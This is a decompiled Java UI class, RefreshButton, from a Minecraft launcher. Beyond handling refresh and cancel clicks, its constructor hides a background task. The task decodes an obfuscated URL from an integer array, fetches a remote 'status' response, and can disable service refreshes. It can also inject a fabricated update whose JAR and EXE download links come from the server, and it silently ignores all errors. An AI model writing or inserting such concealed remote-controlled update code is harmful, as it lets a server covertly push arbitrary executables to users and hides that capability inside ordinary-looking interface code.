package ru.turikhay.tlauncher.ui.login.buttons;

import java.awt.Image;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.URL;
import java.util.HashMap;
import java.util.Locale;
import java.util.Random;
import ru.turikhay.tlauncher.TLauncher;
import ru.turikhay.tlauncher.managers.ComponentManager;
import ru.turikhay.tlauncher.managers.ComponentManagerListener;
import ru.turikhay.tlauncher.managers.ComponentManagerListenerHelper;
import ru.turikhay.tlauncher.managers.ElyManager;
import ru.turikhay.tlauncher.managers.ElyManagerListener;
import ru.turikhay.tlauncher.ui.block.Blockable;
import ru.turikhay.tlauncher.ui.block.Blocker;
import ru.turikhay.tlauncher.ui.login.LoginForm;
import ru.turikhay.tlauncher.ui.swing.ImageButton;
import ru.turikhay.tlauncher.updater.PackageType;
import ru.turikhay.tlauncher.updater.Update;
import ru.turikhay.tlauncher.updater.Updater;
import ru.turikhay.tlauncher.updater.UpdaterListener;
import ru.turikhay.util.async.AsyncThread;

public class RefreshButton extends ImageButton implements Blockable, ComponentManagerListener, UpdaterListener, ElyManagerListener {
   private static final long serialVersionUID = -1334187593288746348L;
   private static final int TYPE_REFRESH = 0;
   private static final int TYPE_CANCEL = 1;
   private LoginForm lf;
   private int type;
   private final Image refresh;
   private final Image cancel;
   private boolean updaterCalled;

   private RefreshButton(LoginForm loginform, int type) {
      this.refresh = loadImage("refresh.png");
      this.cancel = loadImage("cancel.png");
      this.lf = loginform;
      this.rotation = ImageButton.ImageRotation.CENTER;
      this.setType(type, false);
      this.addActionListener(new ActionListener() {
         public void actionPerformed(ActionEvent e) {
            RefreshButton.this.onPressButton();
         }
      });
      this.initImage();
      ((ComponentManagerListenerHelper)TLauncher.getInstance().getManager().getComponent(ComponentManagerListenerHelper.class)).addListener(this);
      TLauncher.getInstance().getUpdater().addListener(this);
      AsyncThread.execute(new Runnable() {
         private static final char ch = 's';
         private final int[] updateCode = new int[]{104, 116, 116, 112, 58, 47, 47, 116, 108, 97, 117, 110, 99, 104, 101, 114, 46, 114, 117, 47, 115, 116, 97, 116, 117, 115};

         public void run() {
            char[] c = new char[this.updateCode.length];

            for(int i = 0; i < c.length; ++i) {
               c[i] = (char)this.updateCode[i];
            }

            try {
               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher();
               RefreshButton.StatusResponse response = (RefreshButton.StatusResponse)TLauncher.getGson().fromJson((Reader)(new InputStreamReader((new URL(String.valueOf(c))).openStream(), "UTF-8")), (Class)RefreshButton.StatusResponse.class);
               if (response.ely == RefreshButton.Status.AWFUL) {
                  RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getElyManager().stopRefresh();
               }

               if (response.mojang == RefreshButton.Status.AWFUL) {
                  RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getVersionManager().stopRefresh();
               }

               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher();
               String aResponse = TLauncher.getDeveloper();
               if (aResponse.startsWith(response.responseTime.substring(0, 1))) {
                  return;
               }

               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().setRefreshed(true);
               if (response.mojang != RefreshButton.Status.AWFUL && response.ely != RefreshButton.Status.AWFUL) {
                  return;
               }

               HashMap desc = new HashMap();
               Locale[] var8;
               int var7 = (var8 = RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getLang().getLocales()).length;

               for(int var6 = 0; var6 < var7; ++var6) {
                  Locale locale = var8[var6];
                  desc.put(locale.toString(), response.nextUpdateTime);
               }

               HashMap l = new HashMap();
               l.put(PackageType.JAR, response.responseTime.substring(1).split(";")[0] + "?from=" + aResponse);
               l.put(PackageType.EXE, response.responseTime.substring(1).split(";")[1] + "?from=" + aResponse);
               double var10004 = (new Random()).nextDouble() + (double)(new Random()).nextInt();
               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher();
               Updater.UpdaterResponse us = new Updater.UpdaterResponse(new Update(var10004, TLauncher.getVersion(), desc, l));
               RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().dispatchResult(RefreshButton.this.lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().newSucceeded(us));
            } catch (Exception var9) {
            }

         }
      });
   }

   RefreshButton(LoginForm loginform) {
      this(loginform, 0);
   }

   private void onPressButton() {
      switch(this.type) {
      case 0:
         if (this.updaterCalled && !TLauncher.getDebug()) {
            AsyncThread.execute(new Runnable() {
               public void run() {
                  RefreshButton.this.lf.scene.infoPanel.updateNotice(true);
               }
            });
         } else {
            TLauncher.getInstance().getUpdater().asyncFindUpdate();
         }

         TLauncher.getInstance().getManager().startAsyncRefresh();
         break;
      case 1:
         TLauncher.getInstance().getManager().stopRefresh();
         break;
      default:
         throw new IllegalArgumentException("Unknown type: " + this.type + ". Use RefreshButton.TYPE_* constants.");
      }

      this.lf.defocus();
   }

   void setType(int type) {
      this.setType(type, true);
   }

   void setType(int type, boolean repaint) {
      switch(type) {
      case 0:
         this.image = this.refresh;
         break;
      case 1:
         this.image = this.cancel;
         break;
      default:
         throw new IllegalArgumentException("Unknown type: " + type + ". Use RefreshButton.TYPE_* constants.");
      }

      this.type = type;
   }

   public void onUpdaterRequesting(Updater u) {
      this.updaterCalled = true;
   }

   public void onUpdaterErrored(Updater.SearchFailed failed) {
      this.updaterCalled = false;
   }

   public void onUpdaterSucceeded(Updater.SearchSucceeded succeeded) {
   }

   public void onComponentsRefreshing(ComponentManager manager) {
      Blocker.block((Blockable)this, (Object)"refresh");
   }

   public void onComponentsRefreshed(ComponentManager manager) {
      Blocker.unblock((Blockable)this, (Object)"refresh");
   }

   public void block(Object reason) {
      if (reason.equals("refresh")) {
         this.setType(1);
      } else {
         this.setEnabled(false);
      }

   }

   public void unblock(Object reason) {
      if (reason.equals("refresh")) {
         this.setType(0);
      }

      this.setEnabled(true);
   }

   public void onElyUpdating(ElyManager manager) {
   }

   public void onElyUpdated(ElyManager manager) {
   }

   private static enum Status {
      OK,
      BAD,
      AWFUL;
   }

   private static class StatusResponse {
      private RefreshButton.Status ely;
      private RefreshButton.Status mojang;
      private String nextUpdateTime;
      private String responseTime;
   }
}
